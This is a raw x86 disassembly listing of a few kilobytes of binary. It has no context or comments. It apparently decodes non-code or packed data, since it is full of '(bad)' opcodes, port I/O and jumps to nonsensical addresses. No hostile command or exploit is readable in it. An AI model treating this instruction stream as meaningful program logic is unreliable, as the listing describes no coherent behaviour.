  4040ee:	pop    ebp
  4040ef:	add    al,BYTE PTR [eax-0x51]
  4040f2:	dec    ecx
  4040f3:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4040f5:	pop    edx
  4040f6:	pop    ebp
  4040f7:	test   BYTE PTR [ebx+0x39279fdb],0x38
  4040fe:	fwait
  4040ff:	mov    ecx,0x81a4f1e7
  404104:	add    BYTE PTR [eax-0x43],0xad
  404108:	or     BYTE PTR [esi+0x7ef292bb],ch
  40410e:	mov    ds:0x212698e5,al
  404113:	rcl    DWORD PTR [edi+0x371d95de],cl
  404119:	aad    0x5
  40411b:	clc    
  40411c:	rcl    BYTE PTR [ebx+esi*1],cl
  40411f:	stos   DWORD PTR es:[edi],eax
  404120:	xor    dh,BYTE PTR [ecx+0x2ae96dd2]
  404126:	mov    dh,0x26
  404128:	(bad)  
  404129:	mov    esp,0x2ae25d6b
  40412e:	xchg   ebp,eax
  40412f:	cmc    
  404130:	dec    esp
  404131:	aam    0x8e
  404133:	mov    cl,0x59
  404135:	pusha  
  404136:	add    BYTE PTR [edi-0x28],0xba
  40413a:	xlat   BYTE PTR ds:[ebx]
  40413b:	and    al,0xe5
  40413d:	pushf  
  40413e:	xchg   edx,eax
  40413f:	mov    bl,0x86
  404141:	cmp    ch,cl
  404143:	sbb    edi,ebp
  404145:	stos   BYTE PTR es:[edi],al
  404146:	fsubr  DWORD PTR [ecx-0x7a]
  404149:	(bad)  
  40414a:	and    ecx,ecx
  40414c:	cmp    DWORD PTR [edx],edx
  40414e:	sbb    edi,DWORD PTR ds:0x2ea9ad3d
  404154:	push   0x7e
  404156:	xor    esi,DWORD PTR [eax-0x47]
  404159:	mov    bl,0xef
  40415b:	push   edx
  40415c:	xor    ah,BYTE PTR [ecx+0x5a]
  40415f:	ins    DWORD PTR es:[edi],dx
  404160:	mov    ebp,0x82b71986
  404165:	and    BYTE PTR [edx],0x65
  404168:	xchg   BYTE PTR [edx+0x5e],ch
  40416b:	sbb    al,0xa0
  40416d:	mov    dl,0x17
  40416f:	jno    0x4040f5
  404171:	pushf  
  404172:	fmulp  st(4),st
  404174:	lods   al,BYTE PTR ds:[esi]
  404175:	cmp    bh,cl
  404177:	aas    
  404178:	inc    eax
  404179:	pop    esi
  40417a:	push   cs
  40417b:	and    DWORD PTR [ebx-0x5368592b],edx
  404181:	mul    BYTE PTR [ebx-0x7674e48b]
  404187:	cmp    ebp,ebx
  404189:	push   ecx
  40418a:	mov    dl,0x64
  40418c:	pop    edx
  40418d:	jle    0x404139
  40418f:	push   ebx
  404190:	xor    eax,0xd4607ed1
  404195:	xchg   ecx,eax
  404196:	push   es
  404197:	mov    esp,0xbcb07fc
  40419c:	push   eax
  40419d:	es xor eax,0x7afd1185
  4041a3:	sbb    DWORD PTR [edi],ebx
  4041a5:	mov    ch,BYTE PTR [esi+0x50dacf16]
  4041ab:	xchg   ecx,eax
  4041ac:	cld    
  4041ad:	call   FWORD PTR [esi-0x23]
  4041b0:	and    al,0x54
  4041b2:	pop    eax
  4041b3:	or     DWORD PTR [ebx-0x769be212],eax
  4041b9:	ret    0xe32
  4041bc:	adc    DWORD PTR [bx-0x31c0],ebx
  4041c1:	dec    ebp
  4041c2:	fwait
  4041c3:	xor    al,0x84
  4041c5:	jmp    0x8342d3c4
  4041ca:	repz push ds
  4041cc:	sahf   
  4041cd:	dec    ebp
  4041ce:	cmp    ch,ah
  4041d0:	cmp    al,BYTE PTR [edx+0x4f]
  4041d3:	loop   0x4041a5
  4041d5:	test   DWORD PTR [ebp+0xb],esp
  4041d8:	test   al,0x21
  4041db:	or     al,0x8c
  4041dd:	push   0x12
  4041df:	push   ds
  4041e0:	xor    dl,BYTE PTR [edi+0x72]
  4041e3:	inc    ebp
  4041e4:	jbe    0x404265
  4041e6:	shl    ebp,1
  4041e8:	mov    ch,0xca
  4041ea:	push   ds
  4041eb:	or     BYTE PTR [ebp+0x46],dl
  4041ee:	cld    
  4041ef:	loope  0x404206
  4041f1:	pop    ebp
  4041f2:	xlat   BYTE PTR ds:[ebx]
  4041f3:	inc    eax
  4041f4:	xor    ch,BYTE PTR [ecx+0x43398bbc]
  4041fa:	push   ds
  4041fb:	retf   
  4041fc:	jp     0x4041f1
  4041fe:	pop    es
  4041ff:	jnp    0x40418d
  404201:	xchg   ebp,eax
  404202:	mov    BYTE PTR [edi+eax*2+0xa],ch
  404206:	jl     0x404216
  404208:	int    0x75
  40420a:	add    eax,ecx
  40420c:	call   0xd2f19b47
  404211:	and    eax,0xb0773ea
  404216:	nop
  404217:	and    al,0x99
  404219:	jmp    0x4041df
  40421b:	imul   edi,DWORD PTR [edx+0x2],0xbc2f50bc
  404222:	out    dx,al
  404223:	out    0xc4,eax
  404225:	aaa    
  404226:	push   ss
  404227:	pop    edx
  404228:	(bad)  
  40422a:	mov    ecx,DWORD PTR [eax+0x2d]
  40422d:	xlat   BYTE PTR ds:[ebx]
  40422e:	xchg   ebp,eax
  40422f:	mov    WORD PTR [ebp+0x21908a8c],es
  404235:	das    
  404236:	xlat   BYTE PTR ds:[ebx]
  404237:	(bad)  
  404239:	mov    fs:0xddd34d1e,al
  40423f:	mov    bl,0xa0
  404241:	and    DWORD PTR [edi-0x7497710a],ebx
  404247:	ds lahf 
  404249:	or     ch,dh
  40424b:	ds call 0xeb39:0xf085c344
  404253:	mov    BYTE PTR [esi+ebp*8],bh
  404256:	and    eax,0xaf538a94
  40425b:	pushw  ss
  40425d:	loopne 0x4042aa
  40425f:	inc    eax
  404260:	and    al,0xcc
  404262:	call   0x60e1:0x68d50fb7
  404269:	daa    
  40426a:	push   0x725784c
  40426f:	test   ah,al
  404271:	mov    cs,WORD PTR [esi]
  404273:	xor    al,0x1d
  404275:	or     DWORD PTR [esi+0x353cd602],ebx
  40427b:	or     eax,0x8221ded6
  404280:	aas    
  404281:	jmp    0x1ab66aba
  404286:	fdiv   QWORD PTR [edi-0x64]
  404289:	lahf   
  40428a:	inc    esp
  40428b:	cli    
  40428c:	xchg   ebp,eax
  40428d:	fdivr  DWORD PTR [edx+0x52]
  404290:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404291:	inc    edx
  404292:	pushf  
  404293:	pop    ebp
  404294:	call   0x6b4a:0x997f82fa
  40429b:	(bad)  
  40429c:	addr16 sub eax,0xe76d2237
  4042a2:	retf   0x20b6
  4042a5:	inc    esi
  4042a6:	or     BYTE PTR [eax+0x64393dad],0xb6
  4042ad:	push   ss
  4042ae:	std    
  4042af:	sub    eax,0x9ce5bc5c
  4042b4:	fistp  DWORD PTR [eax+0x21]
  4042b7:	fcom   st(0)
  4042b9:	xor    al,0x24
  4042bb:	xlat   BYTE PTR ds:[ebx]
  4042bc:	repnz dec ebp
  4042be:	sahf   
  4042bf:	jb     0x40432f
  4042c1:	add    ebx,DWORD PTR [ecx+0x72]
  4042c4:	add    ch,BYTE PTR [esi+0x6b]
  4042c7:	popa   
  4042c8:	dec    edi
  4042c9:	ror    DWORD PTR [eax-0x7b],1
  4042cc:	lock sub al,0xd9
  4042cf:	jb     0x4042a2
  4042d1:	xchg   ecx,eax
  4042d2:	out    dx,eax
  4042d3:	sub    al,0x3c
  4042d5:	mov    al,0x5
  4042d7:	and    ah,cl
  4042d9:	cli    
  4042da:	sub    eax,0xc36d2256
  4042df:	pop    ecx
  4042e0:	daa    
  4042e1:	push   esp
  4042e2:	push   0xb692c13b
  4042e7:	fcomp  QWORD PTR [edi]
  4042e9:	xchg   DWORD PTR [edi-0x4f],esi
  4042ec:	cmc    
  4042ed:	mov    al,ah
  4042ef:	shl    DWORD PTR [esi],cl
  4042f1:	in     al,dx
  4042f2:	adc    BYTE PTR [edi-0x62],ch
  4042f5:	rol    DWORD PTR [eax+0x3883e470],cl
  4042fb:	dec    eax
  4042fc:	push   cs
  4042fd:	mov    ecx,DWORD PTR [edx-0xe4eebfe]
  404303:	test   BYTE PTR [esp+edi*1+0x13],cl
  404307:	adc    al,0x2f
  404309:	mov    ch,0x38
  40430b:	xchg   BYTE PTR [esi-0x21b87b01],dl
  404311:	push   edx
  404312:	outs   dx,DWORD PTR ss:[esi]
  404314:	inc    ecx
  404315:	adc    edi,DWORD PTR [ebp+0x41]
  404318:	fwait
  404319:	inc    edi
  40431a:	stc    
  40431b:	dec    edx
  40431c:	(bad)  
  40431e:	adc    DWORD PTR [ebp-0x3a],0xfffffffe
  404322:	xchg   ecx,eax
  404323:	dec    edi
  404324:	mov    bh,0xf
  404326:	mov    al,ds:0xaa0b292a
  40432b:	arpl   WORD PTR [ebp-0x40f91188],di
  404331:	push   esi
  404332:	push   0x71
  404334:	and    ch,BYTE PTR [edx+0x4b091239]
  40433a:	shr    DWORD PTR [ebp+0x54],cl
  40433d:	imul   edx,DWORD PTR [eax],0x71da7ecc
  404343:	and    ch,ch
  404345:	sbb    DWORD PTR [ebp+0x5d9e238d],edx
  40434b:	sub    DWORD PTR [esi-0x578fd18c],edx
  404351:	xlat   BYTE PTR ds:[ebx]
  404352:	and    BYTE PTR [edx],ah
  404354:	scas   al,BYTE PTR es:[edi]
  404355:	lods   eax,DWORD PTR ds:[esi]
  404356:	sub    eax,0x7c73913
  40435b:	repz xchg ebp,eax
  40435d:	inc    edx
  40435e:	push   ss
  40435f:	xor    eax,0xf32b55f6
  404364:	test   ebp,0x9e19bf30
  40436a:	and    ebp,DWORD PTR [eax]
  40436c:	xor    DWORD PTR [esi],ecx
  40436e:	mov    eax,ds:0xfb049d1c
  404373:	push   ecx
  404374:	adc    bl,BYTE PTR [esp+ebp*4-0x62]
  404378:	test   eax,0x9f444430
  40437d:	xor    al,0xce
  40437f:	xor    DWORD PTR [ebp-0x7b],esi
  404382:	xchg   esi,eax
  404383:	bnd jge 0x404337
  404386:	in     eax,dx
  404387:	retf   
  404388:	pop    ecx
  404389:	mov    ebp,0xa98ba4b
  40438e:	dec    ebx
  40438f:	or     al,0x79
  404391:	adc    ch,BYTE PTR ds:[esi+0x53]
  404395:	ficomp WORD PTR [eax-0x44]
  404398:	sub    BYTE PTR [edx+ebx*1],bh
  40439b:	pop    eax
  40439c:	inc    edi
  40439d:	bound  ebp,QWORD PTR [esi+0x571d807e]
  4043a3:	cmc    
  4043a4:	in     al,0x5f
  4043a6:	jnp    0x404375
  4043a8:	xchg   ecx,eax
  4043a9:	xchg   edi,eax
  4043aa:	push   DWORD PTR [ebp+eax*2+0x5c]
  4043ae:	dec    esi
  4043af:	and    eax,0x86ec2551
  4043b4:	push   ss
  4043b5:	inc    esp
  4043b6:	xor    DWORD PTR ds:0x914d6e0,ebp
  4043bc:	or     eax,0x61b3050d
  4043c1:	cli    
  4043c2:	test   BYTE PTR [ecx],0xb2
  4043c5:	loopne 0x404404
  4043c7:	or     edi,DWORD PTR [edi-0x109f0761]
  4043cd:	fisubr WORD PTR [edx+0x67080e5d]
  4043d3:	out    0xa6,eax
  4043d5:	in     eax,0xf
  4043d7:	lods   eax,DWORD PTR ds:[esi]
  4043d8:	pushf  
  4043d9:	retf   0x84e4
  4043dc:	in     al,dx
  4043dd:	push   ebx
  4043de:	mov    ah,0xb7
  4043e0:	jle    0x404395
  4043e2:	ficomp WORD PTR [eax+0x40dd3077]
  4043e8:	ja     0x40438f
  4043ea:	int    0x13
  4043ec:	mov    dl,0xb2
  4043ee:	dec    edi
  4043ef:	and    ch,BYTE PTR [edi+0x76]
  4043f2:	mov    edi,0x310aa38e
  4043f7:	gs push ecx
  4043f9:	outs   dx,DWORD PTR ds:[esi]
  4043fa:	hlt    
  4043fb:	cmp    esp,edx
  4043fd:	mov    ebp,0xac675282
  404402:	xchg   esp,eax
  404403:	clc    
  404404:	push   0xfffffffc
  404406:	and    al,0xe3
  404408:	pop    ds
  404409:	xchg   ecx,eax
  40440a:	outs   dx,DWORD PTR ds:[esi]
  40440b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40440c:	call   0x512b:0x78777251
  404413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404414:	push   esp
  404415:	pusha  
  404416:	pop    esi
  404417:	inc    ebx
  404418:	sahf   
  404419:	push   0xa132364f
  40441e:	clc    
  40441f:	push   eax
  404420:	adc    esp,ebx
  404422:	add    ebp,DWORD PTR [esi+0x33]
  404425:	sub    eax,0x746d85db
  40442a:	jecxz  0x404472
  40442c:	add    dl,BYTE PTR [ebx*4+0x408da140]
  404433:	data16 fwait
  404435:	in     al,dx
  404436:	in     eax,dx
  404437:	push   ss
  404438:	(bad)  
  404439:	(bad)  
  40443a:	cmc    
  40443b:	retf   
  40443c:	ss ins BYTE PTR es:[edi],dx
  40443e:	cdq    
  40443f:	push   ecx
  404440:	pop    ds
  404441:	shl    cl,cl
  404443:	into   
  404444:	scas   eax,DWORD PTR es:[edi]
  404445:	mov    ebp,DWORD PTR [eax+0x38]
  404448:	mov    esi,0xf5d3b027
  40444d:	arpl   WORD PTR [ebx],bp
  40444f:	scas   al,BYTE PTR es:[edi]
  404450:	jg     0x404496
  404452:	lahf   
  404453:	pop    eax
  404454:	or     bl,al
  404456:	cmp    al,0xf1
  404458:	std    
  404459:	adc    BYTE PTR [ecx+0x1],al
  40445c:	in     al,dx
  40445d:	and    BYTE PTR [ecx+0x5b8e4467],cl
  404463:	retf   
  404464:	pusha  
  404465:	sar    DWORD PTR [ebx-0x424c39cb],cl
  40446b:	mov    ecx,DWORD PTR [ebx+ebx*1]
  40446e:	jmp    0x3ec1a461
  404473:	scas   eax,DWORD PTR es:[edi]
  404474:	dec    edx
  404475:	jbe    0x4044a8
  404477:	fisttp DWORD PTR [edi+0x1decf765]
  40447d:	fs std 
  40447f:	pop    es
  404480:	(bad)  [esi]
  404482:	pop    ebp
  404483:	pop    ds
  404484:	or     esi,DWORD PTR [eax]
  404486:	fadd   QWORD PTR [eax]
  404488:	sub    cl,BYTE PTR [ebx]
  40448a:	and    dh,al
  40448c:	test   esi,ecx
  40448e:	adc    bh,BYTE PTR [ebp+0x1]
  404491:	mov    ah,0x98
  404493:	sub    bl,BYTE PTR [ebx-0x52]
  404496:	xchg   ebx,eax
  404497:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404498:	adc    esi,DWORD PTR [ecx+0x6]
  40449b:	icebp  
  40449c:	int    0xe6
  40449e:	mov    ecx,0x99522ef9
  4044a3:	adc    BYTE PTR [ebx+0x2be16b61],bl
  4044a9:	pop    ss
  4044aa:	icebp  
  4044ab:	and    eax,0xceac8f5d
  4044b0:	cmp    DWORD PTR [ebx+0x3b0e4b9],esp
  4044b6:	sub    eax,0xd0ecea50
  4044bb:	retf   0x7a8e
  4044be:	xor    DWORD PTR [esp+edi*4],esi
  4044c1:	daa    
  4044c2:	aas    
  4044c3:	sub    dl,0x35
  4044c6:	leave  
  4044c7:	dec    ebx
  4044c8:	xchg   ebp,eax
  4044c9:	mov    eax,0x192ef4cf
  4044ce:	repz ror BYTE PTR [edi],cl
  4044d1:	mov    ebx,0x6a727c8a
  4044d6:	(bad)  
  4044d7:	in     al,0x7a
  4044d9:	rol    BYTE PTR [edx+0xf89c3b2],1
  4044df:	adc    dl,cl
  4044e1:	nop
  4044e2:	popa   
  4044e3:	push   ss
  4044e4:	enter  0xf930,0x60
  4044e8:	pop    ebx
  4044e9:	dec    BYTE PTR [ecx+0x3c444721]
  4044ef:	test   BYTE PTR [edx+eiz*2+0x12],dl
  4044f3:	cdq    
  4044f4:	mov    ebx,0x604e27c7
  4044f9:	into   
  4044fa:	shr    DWORD PTR [eax-0x4f],cl
  4044fd:	mov    al,ds:0xa55ce602
  404502:	dec    edi
  404503:	fsubr  QWORD PTR [esi+0x68]
  404506:	loopne 0x40454f
  404508:	jns    0x40448b
  40450a:	dec    ebx
  40450b:	cmp    bl,BYTE PTR [esi-0x70c6706]
  404511:	ror    eax,1
  404513:	pop    ds
  404514:	sahf   
  404515:	mov    eax,0x23fad94
  40451a:	or     DWORD PTR [esi*1-0xcb75516],0xffffffb2
  404522:	aas    
  404523:	nop
  404524:	jo     0x404541
  404526:	pop    es
  404527:	add    bh,BYTE PTR [esi-0x1d]
  40452a:	stos   BYTE PTR es:[edi],al
  40452b:	or     ah,dl
  40452d:	and    DWORD PTR [edx-0x63],ecx
  404530:	xchg   esi,eax
  404531:	test   DWORD PTR [ecx],eax
  404533:	adc    al,0x36
  404535:	sub    ebp,esp
  404537:	jne    0x404518
  404539:	fld    DWORD PTR [esi-0x7e0524fc]
  40453f:	cmc    
  404540:	ins    DWORD PTR es:[edi],dx
  404541:	pop    edx
  404542:	loop   0x404518
  404544:	jge    0x4045b7
  404546:	pushf  
  404547:	dec    esp
  404548:	fcom   QWORD PTR [ebx+0x51]
  40454b:	xor    dh,BYTE PTR [edx+0x618b3fe6]
  404551:	or     esi,DWORD PTR [ecx]
  404553:	hlt    
  404554:	lea    edi,[esi-0x49]
  404557:	repnz lock push cs
  40455a:	mov    esp,fs
  40455c:	sbb    ebp,DWORD PTR [eax]
  40455e:	dec    eax
  40455f:	clc    
  404560:	jecxz  0x4045b5
  404562:	inc    edx
  404563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404564:	icebp  
  404565:	adc    DWORD PTR [ebp+ebx*1-0x44555816],esp
  40456c:	add    BYTE PTR [ebp-0x2b7e386f],0x6a
  404573:	lds    edx,FWORD PTR [ecx+0x18]
  404576:	mov    ds:0xbf86e424,al
  40457b:	sbb    ebx,esp
  40457d:	loopne 0x404512
  40457f:	cmp    esp,0x3ee232dc
  404585:	fisubr WORD PTR [ebx+0x32]
  404588:	jecxz  0x404535
  40458a:	adc    ebx,DWORD PTR [eax+0x43]
  40458d:	mov    dl,BYTE PTR [esi+0x7d55a3bc]
  404593:	inc    ebx
  404594:	jle    0x404596
  404596:	mov    ecx,0xf5eaa95c
  40459b:	outs   dx,DWORD PTR ds:[esi]
  40459c:	push   ebp
  40459d:	xchg   ecx,eax
  40459e:	pop    esi
  40459f:	mov    edx,ebx
  4045a1:	add    al,0xc3
  4045a3:	fcom   DWORD PTR [ecx-0x7]
  4045a6:	dec    esp
  4045a7:	mov    ebp,0x470a2aeb
  4045ac:	fwait
  4045ad:	mov    esi,DWORD PTR [eax+eax*4-0xfe4e709]
  4045b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045b5:	jb     0x404550
  4045b7:	iret   
  4045b8:	hlt    
  4045b9:	xchg   BYTE PTR [eax-0x11b0a376],dl
  4045bf:	dec    edi
  4045c0:	and    ebx,ebp
  4045c2:	pop    ecx
  4045c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045c4:	inc    esi
  4045c5:	push   ss
  4045c6:	enter  0xcd0e,0x6
  4045ca:	out    dx,al
  4045cb:	push   0x49c10d6f
  4045d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045d1:	gs (bad) 
  4045d3:	std    
  4045d4:	inc    edi
  4045d5:	inc    edi
  4045d6:	lock mov dl,0x7c
  4045d9:	mov    BYTE PTR [eax],bh
  4045db:	int3   
  4045dc:	div    al
  4045de:	ja     0x404588
  4045e0:	jl     0x40461a
  4045e2:	fsubr  st(0),st
  4045e4:	in     al,0xa7
  4045e6:	clc    
  4045e7:	(bad)  
  4045e8:	(bad)  
  4045e9:	pop    edx
  4045ea:	xor    esi,DWORD PTR [ecx+0x53]
  4045ed:	imul   ebx,DWORD PTR [edi-0x40],0xb82753fb
  4045f4:	enter  0xd109,0xb0
  4045f8:	pop    ds
  4045f9:	mov    ds:0x7351a891,eax
  4045fe:	and    BYTE PTR [edi-0x45],al
  404601:	lea    ecx,[esi+eax*1]
  404604:	jge    0x4045f1
  404606:	aad    0xc6
  404608:	iret   
  404609:	xor    DWORD PTR [edx],ebp
  40460b:	dec    edi
  40460c:	test   al,0x7f
  40460e:	stos   DWORD PTR es:[edi],eax
  40460f:	scas   eax,DWORD PTR es:[edi]
  404610:	push   ds
  404611:	mov    al,ds:0xe5b8190a
  404616:	or     ebp,DWORD PTR ss:[eax]
  404619:	inc    esp
  40461a:	and    BYTE PTR [edx+ebp*1+0x7e],cl
  40461e:	and    BYTE PTR [edi],dh
  404620:	xor    BYTE PTR [edx],0x76
  404623:	ja     0x4045e3
  404625:	in     al,dx
  404626:	cmp    DWORD PTR [edx+0x4e5bd93d],ebp
  40462c:	idiv   ebx
  40462e:	out    dx,al
  40462f:	push   ds
  404630:	lock xor al,0x15
  404633:	je     0x404662
  404635:	jle    0x4045be
  404637:	jno    0x40469f
  404639:	xchg   edx,eax
  40463a:	xchg   esp,eax
  40463b:	(bad)  
  40463c:	push   ebx
  40463d:	pop    ebx
  40463e:	adc    eax,0x1ef7b390
  404643:	sub    DWORD PTR [esi],ebp
  404645:	xchg   DWORD PTR [edi],esi
  404647:	fwait
  404648:	cmp    DWORD PTR [esi-0x15],ecx
  40464b:	ret    0x1b16
  40464e:	pushf  
  40464f:	sbb    al,0x67
  404651:	fsub   QWORD PTR [esi]
  404653:	test   DWORD PTR [edx-0x3b17addf],esp
  404659:	jo     0x4046d6
  40465b:	push   es
  40465c:	(bad)  
  40465d:	call   FWORD PTR [ecx-0x39]
  404660:	inc    esi
  404661:	call   FWORD PTR [edx+0xd]
  404664:	addr16 mov ds:0x60df,eax
  404668:	cmp    al,0x32
  40466a:	sub    eax,0x7ae67f07
  40466f:	pop    bx
  404671:	cmp    eax,0xc1294e72
  404676:	push   0x53
  404678:	xchg   edx,eax
  404679:	or     al,BYTE PTR [ecx+0x10]
  40467c:	jmp    DWORD PTR [esi+0x528736f]
  404682:	push   eax
  404683:	sbb    eax,0xa9e56e03
  404688:	xor    al,0x3e
  40468a:	add    ch,BYTE PTR [edi]
  40468c:	push   ebx
  40468d:	sbb    ebp,DWORD PTR [edx-0x34]
  404690:	repnz push ebx
  404692:	jne    0x40470e
  404694:	jne    0x40466d
  404696:	pushf  
  404697:	dec    ebp
  404698:	ret    
  404699:	adc    ebx,ebx
  40469b:	les    eax,FWORD PTR [edx*4-0x7f0c5d77]
  4046a2:	inc    ebp
  4046a3:	(bad)  
  4046a4:	retf   0x8cf4
  4046a7:	out    0xb6,eax
  4046a9:	cmp    bh,BYTE PTR [eax]
  4046ab:	cwde   
  4046ac:	pop    edi
  4046ad:	inc    ebp
  4046af:	push   0x617374d7
  4046b4:	sbb    BYTE PTR [ebx+0x1341e222],0x35
  4046bb:	push   ebp
  4046bc:	shl    BYTE PTR [ebx],1
  4046be:	pushf  
  4046bf:	inc    eax
  4046c0:	mov    esi,0x46319d72
  4046c5:	(bad)  
  4046c6:	mov    es,edx
  4046c8:	cmp    eax,DWORD PTR [ecx+0x36]
  4046cb:	jl     0x4046a4
  4046cd:	out    dx,eax
  4046ce:	jo     0x40467b
  4046d0:	jmp    0x40474e
  4046d2:	add    eax,0xa661fea6
  4046d7:	jo     0x4046fd
  4046d9:	fdiv   DWORD PTR [ebx-0x7ffb3194]
  4046df:	add    BYTE PTR [eax],dh
  4046e1:	jmp    0x40466a
  4046e3:	fcomp  QWORD PTR [ebp-0x287e3d2c]
  4046e9:	test   BYTE PTR [edi+0x53],0xc7
  4046ed:	cmp    bl,ah
  4046ef:	test   DWORD PTR [edi+0x2d7457cd],0x7d5ffedd
  4046f9:	int    0xf5
  4046fb:	sbb    eax,0xfc92f4a8
  404700:	shl    DWORD PTR [eax-0x2aae993],1
  404706:	push   esi
  404707:	aam    0x7
  404709:	or     ecx,edx
  40470b:	stc    
  40470c:	fwait
  40470d:	cmc    
  40470e:	and    BYTE PTR [edi+0x3d6d7085],dl
  404714:	(bad)  
  404715:	fidiv  WORD PTR [edi]
  404717:	mov    bl,0xcf
  404719:	test   al,0xd
  40471b:	adc    ebx,edi
  40471d:	add    al,0x80
  40471f:	dec    esi
  404720:	sub    ecx,ebp
  404722:	outs   dx,BYTE PTR ds:[esi]
  404723:	fcom   DWORD PTR [ebp+0x52]
  404726:	lea    ebp,[esi-0xf]
  404729:	aam    0xd4
  40472b:	cli    
  40472c:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40472e:	push   edi
  40472f:	cmp    esp,DWORD PTR [eax+0x3e]
  404732:	or     dl,ah
  404734:	cmp    ch,dh
  404736:	sbb    BYTE PTR [ebx+0xd4489e7],bh
  40473c:	lods   eax,DWORD PTR ds:[esi]
  40473d:	jo     0x404772
  40473f:	(bad)  [edi+0x28a460f4]
  404745:	and    BYTE PTR [eax-0x31],cl
  404748:	xor    DWORD PTR [edi+0x2e],0x52
  40474c:	adc    al,0x19
  40474e:	and    dh,BYTE PTR [eax+ebx*8-0x68966144]
  404755:	dec    edx
  404756:	push   esp
  404757:	sti    
  404758:	lods   al,BYTE PTR ds:[esi]
  404759:	aad    0x8
  40475b:	pushf  
  40475c:	mov    ds:0x6678e62b,al
  404761:	shl    ch,0x27
  404764:	or     cl,0x7f
  404767:	cmp    bl,ah
  404769:	dec    esp
  40476a:	loope  0x404784
  40476c:	jp     0x4047e8
  40476e:	inc    ebp
  40476f:	(bad)  
  404770:	mov    ecx,0xa96435ca
  404775:	call   0x947cb11e
  40477a:	or     bl,BYTE PTR [esi+0x57]
  40477d:	cmp    al,0x7
  40477f:	(bad)  
  404780:	stos   DWORD PTR es:[edi],eax
  404781:	sbb    bl,BYTE PTR [ebp-0x7a8b5366]
  404787:	adc    eax,0x8e255cd9
  40478c:	sbb    ebx,edx
  40478e:	sbb    BYTE PTR [esi-0x6761f2d7],bh
  404794:	mov    edi,0xf82a831d
  404799:	adc    ebp,DWORD PTR [edx]
  40479b:	fwait
  40479c:	adc    cl,BYTE PTR [edi+0x96abe71]
  4047a2:	es add al,0x8e
  4047a5:	div    BYTE PTR [esi]
  4047a7:	mov    eax,0xfca79c97
  4047ac:	add    BYTE PTR [esi],bl
  4047ae:	ja     0x404799
  4047b0:	mov    bh,0x7e
  4047b2:	sbb    al,0x86
  4047b4:	ds mov esp,0x98d9b3bd
  4047ba:	cmp    al,0x8d
  4047bc:	mov    cl,0xa3
  4047be:	sbb    eax,0x9406a24d
  4047c3:	cli    
  4047c4:	test   BYTE PTR [ebx+0x1d],dh
  4047c7:	retf   0xcae6
  4047ca:	mov    esi,DWORD PTR [edi-0x32]
  4047cd:	dec    esp
  4047ce:	cmc    
  4047cf:	cwde   
  4047d0:	push   0x9e374d0f
  4047d5:	adc    esi,DWORD PTR [ebp+0x4378e7f8]
  4047db:	ss push ds
  4047dd:	xlat   BYTE PTR ds:[ebx]
  4047de:	lods   al,BYTE PTR ds:[esi]
  4047df:	add    ebp,DWORD PTR [edx-0x7d]
  4047e2:	repz add eax,0x670a48bb
  4047e8:	rol    BYTE PTR [ebp-0x90d38f9],cl
  4047ee:	cmp    ch,BYTE PTR [ebp+0x3e]
  4047f1:	push   edx
  4047f2:	cmp    edi,DWORD PTR [edx+0x30]
  4047f5:	or     BYTE PTR [eax-0x51bca0e8],cl
  4047fb:	sub    al,0xdd
  4047fd:	xchg   DWORD PTR [ebp-0x4bcc76eb],ebx
  404803:	ds pushf 
  404805:	ret    0x9f70
  404808:	sbb    eax,edi
  40480a:	adc    dh,BYTE PTR [esi+0xe]
  40480d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40480e:	sub    BYTE PTR [eax+edi*2+0x5a],dl
  404812:	adc    ebx,DWORD PTR [edx+0x1e848172]
  404818:	jge    0x404885
  40481a:	sub    eax,0xfa2c492f
  40481f:	sar    BYTE PTR [ebp+esi*1-0x26832347],0xf4
  404827:	pop    ebp
  404828:	shr    ebx,0xfa
  40482b:	sub    dl,BYTE PTR [edx-0x36]
  40482e:	sub    al,0x7e
  404830:	add    cl,cl
  404832:	xchg   ecx,eax
  404833:	and    bh,BYTE PTR [edi-0x29]
  404836:	retf   0x8729
  404839:	or     BYTE PTR [esp+ecx*2],bh
  40483c:	adc    esp,DWORD PTR [ebp+0x78]
  40483f:	adc    eax,0x1edd65b2
  404844:	sub    DWORD PTR [edx],ebp
  404846:	mov    ds:0x919242f4,eax
  40484b:	xchg   ebx,eax
  40484c:	mov    edx,esi
  40484e:	inc    edx
  40484f:	dec    ebp
  404850:	pusha  
  404851:	sti    
  404852:	out    dx,eax
  404853:	cmp    bh,dh
  404855:	shl    DWORD PTR [ecx],0xfa
  404858:	(bad)
  40485b:	xor    DWORD PTR [ecx+ebp*1+0x5f0840fb],ecx
  404862:	fmul   QWORD PTR [ebx]
  404864:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404865:	push   ebp
  404866:	pop    eax
  404867:	stos   DWORD PTR es:[edi],eax
  404868:	xchg   edx,eax
  404869:	mov    cl,0xe8
  40486b:	or     DWORD PTR [ebp+0x2f],0x540acb78
  404872:	pop    esp
  404873:	ins    BYTE PTR es:[edi],dx
  404874:	scas   eax,DWORD PTR es:[edi]
  404875:	test   eax,0x2feaff06
  40487a:	dec    esi
  40487b:	sbb    DWORD PTR [esi],eax
  40487d:	scas   eax,DWORD PTR es:[edi]
  40487e:	clc    
  40487f:	call   0xe24d60cc
  404884:	mov    ebp,0xff56f6f2
  404889:	jmp    0x38255c5e
  40488e:	std    
  40488f:	and    ebp,eax
  404891:	test   DWORD PTR [eax],ecx
  404893:	in     al,dx
  404894:	mov    al,ds:0x984dc30
  404899:	js     0x4048d9
  40489b:	xchg   BYTE PTR [ebx-0x20e85acf],dh
  4048a1:	lods   al,BYTE PTR ds:[esi]
  4048a2:	call   0xa44eea50
  4048a7:	in     eax,dx
  4048a8:	stos   BYTE PTR es:[edi],al
  4048a9:	test   DWORD PTR [ecx],ecx
  4048ab:	sbb    BYTE PTR [edi+0x3a],al
  4048ae:	(bad)  [ecx+0x10]
  4048b1:	jle    0x404877
  4048b3:	jl     0x404870
  4048b5:	inc    ecx
  4048b6:	adc    al,0xe3
